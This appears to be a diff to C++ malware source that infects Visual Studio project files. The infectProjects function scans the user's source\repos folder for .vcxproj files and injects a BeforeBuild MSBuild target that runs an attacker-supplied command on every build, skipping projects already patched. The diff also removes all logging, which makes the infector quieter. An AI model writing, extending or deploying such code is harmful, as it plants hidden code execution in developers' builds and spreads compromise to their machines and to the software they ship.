@@ -8,10 +8,29 @@
 
 namespace fs = std::filesystem;
 
+std::wstring getCommonRepoDir() {
+    wchar_t* userProfile = nullptr;
+    size_t len = 0;
+
+    // Get the USERPROFILE environment variable (e.g., C:\Users\USERNAME)
+    _wdupenv_s(&userProfile, &len, L"USERPROFILE");
+
+    if (userProfile) {
+        std::wstring repoPath = userProfile;
+        free(userProfile);
+        repoPath += L"\\source\\repos";
+
+        return repoPath;
+    }
+
+    // Fallback if environment variable is missing
+    return L"C:\\Users\\Default\\source\\repos";
+}
+
+
 
 // Main injection logic for .vcxproj files
 void infectProjects(const std::wstring& rootDir, const std::wstring& cmd) {
-    writeLog(L"Scanning directory: " + rootDir);
 
     std::wstring block =
         L"\n  <Target Name=\"BeforeBuild\" BeforeTargets=\"PrepareForBuild\">\n"
@@ -22,11 +41,9 @@ void infectProjects(const std::wstring& rootDir, const std::wstring& cmd) {
         if (item.path().extension() != L".vcxproj") continue;
 
         std::wstring path = item.path();
-        writeLog(L"Checking: " + path);
 
         std::wifstream input(path);
         if (!input) {
-            writeLog(L"Couldn't open: " + path);
             continue;
         }
 
@@ -37,7 +54,6 @@ void infectProjects(const std::wstring& rootDir, const std::wstring& cmd) {
         std::wstring contents = buffer.str();
 
         if (contents.find(L"Name=\"BeforeBuild\"") != std::wstring::npos) {
-            writeLog(L"Already patched: " + path);
             continue;
         }
 
@@ -55,14 +71,13 @@ void infectProjects(const std::wstring& rootDir, const std::wstring& cmd) {
             if (output) {
                 output << contents;
                 output.close();
-                writeLog(L"Injected: " + path);
             } else {
-                writeLog(L"Write failed: " + path);
+                //write failed
             }
         } else {
-            writeLog(L"No insertion point in: " + path);
+            //no place to insert prebuildevent
         }
     }
 
-    writeLog(L"Scan finished.");
+    //scan finishes here
 }
